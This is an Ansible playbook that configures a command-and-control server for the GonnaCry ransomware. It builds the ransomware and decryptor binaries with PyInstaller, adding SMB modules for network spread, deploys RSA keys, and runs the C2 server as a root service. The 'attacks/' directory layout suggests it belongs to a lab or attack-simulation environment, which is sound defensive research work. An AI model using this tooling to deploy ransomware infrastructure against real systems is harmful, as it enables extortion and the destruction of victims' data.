---
- name: Configure GonnaCry C2 server
  hosts: c2
  become: true
  gather_facts: false

  vars:
    c2_dir: /opt/gonnacry-server
    gonnacry_server_src: "{{ project_root }}/attacks/GonnaCry/src/Server"

  tasks:

    - name: Wait for cloud-init to finish
      wait_for_connection:
        timeout: 300
        delay: 5

    - name: Install python3-pip
      apt:
        name: python3-pip
        update_cache: true
        state: present

    - name: Install Python dependencies
      pip:
        name:
          - pycryptodome
          - flask
          - requests
          - pyinstaller
          - smbprotocol
        executable: pip3

    - name: Create C2 server directories
      file:
        path: "{{ item }}"
        state: directory
        mode: '0700'
      loop:
        - "{{ c2_dir }}"
        - "{{ c2_dir }}/binaries"

    - name: Deploy server.py
      copy:
        src: "{{ gonnacry_server_src }}/server.py"
        dest: "{{ c2_dir }}/server.py"
        mode: '0600'

    - name: Deploy RSA key pair
      copy:
        src: "{{ gonnacry_server_src }}/{{ item }}"
        dest: "{{ c2_dir }}/{{ item }}"
        mode: '0600'
      loop:
        - private_key.key
        - public_key.key

    - name: Copy GonnaCry source for build
      copy:
        src: "{{ project_root }}/attacks/GonnaCry/src/GonnaCry/"
        dest: /tmp/gonnacry-build/
        mode: '0644'

    - name: Build gonnacry binary
      shell: |
        export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
        cd /tmp/gonnacry-build
        python3 -m PyInstaller --onefile --distpath /tmp/gonnacry-dist \
            --workpath /tmp/gonnacry-work --specpath /tmp/gonnacry-spec \
            --hidden-import=smbprotocol \
            --hidden-import=smbclient \
            --hidden-import=spnego \
            --hidden-import=spnego.backends \
            --hidden-import=spnego.backends.ntlm \
            --hidden-import=spnego.backends.kerberos \
            --hidden-import=smbprotocol.security_descriptor \
            --hidden-import=smbprotocol.reparse_point \
            --name gonnacry main.py
      args:
        executable: /bin/bash

    - name: Build decryptor binary
      shell: |
        export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
        cd /tmp/gonnacry-build
        python3 -m PyInstaller --onefile --distpath /tmp/gonnacry-dist \
            --workpath /tmp/gonnacry-work --specpath /tmp/gonnacry-spec \
            --hidden-import=smbprotocol \
            --hidden-import=smbclient \
            --hidden-import=spnego \
            --hidden-import=spnego.backends \
            --hidden-import=spnego.backends.ntlm \
            --hidden-import=spnego.backends.kerberos \
            --hidden-import=smbprotocol.security_descriptor \
            --hidden-import=smbprotocol.reparse_point \
            --name decryptor decryptor.py
      args:
        executable: /bin/bash

    - name: Deploy built binaries
      copy:
        src: "/tmp/gonnacry-dist/{{ item }}"
        dest: "{{ c2_dir }}/binaries/{{ item }}"
        mode: '0755'
        remote_src: true
      loop:
        - gonnacry
        - decryptor

    - name: Install gonnacry-server systemd service
      copy:
        dest: /etc/systemd/system/gonnacry-server.service
        content: |
          [Unit]
          Description=GonnaCry C2 Server
          After=network.target

          [Service]
          WorkingDirectory={{ c2_dir }}
          ExecStart=/usr/bin/python3 {{ c2_dir }}/server.py
          Restart=on-failure
          RestartSec=5
          User=root

          [Install]
          WantedBy=multi-user.target

    - name: Enable and start gonnacry-server
      systemd:
        name: gonnacry-server
        daemon_reload: true
        enabled: true
        state: started

    - name: Verify server is listening on port {{ gonnacry_server_port }}
      wait_for:
        host: 127.0.0.1
        port: "{{ gonnacry_server_port }}"
        timeout: 30
